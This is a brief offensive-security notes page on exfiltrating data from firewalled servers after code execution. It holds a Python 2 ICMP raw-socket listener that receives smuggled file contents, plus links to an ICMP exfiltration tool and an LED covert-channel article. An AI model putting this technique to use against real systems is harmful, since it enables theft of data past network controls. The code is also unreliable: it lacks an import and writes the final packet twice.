# Data Exfiltration

When executing code or performing post-exploitation on a server, it's possible to run into a situation where we're unable to actually return results.  Classic examples of this could be locked down network servers where code-execution is possible but all firewall ports are locked down.  It becomes impossible to execute a reverse shell, but we can use the below techniques to exfiltrate data.

## ICMP

### File Exfiltration

```py
def listen():
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    with open('icmpoutput.txt','wb') as catch:   
        while 1:
            data, addr = s.recvfrom(1508)
            print "Packet from %r: %r" % (addr,data)
            if '^BOF' in data:
                continue
            if '^EOF' in data:
                catch.write(data[-1472:-4])
            catch.write(data[-1472:])

listen()
```

https://github.com/api0cradle/Powershell-ICMP

## Error Codes

https://www.wired.com/2017/02/malware-sends-stolen-data-drone-just-pcs-blinking-led/



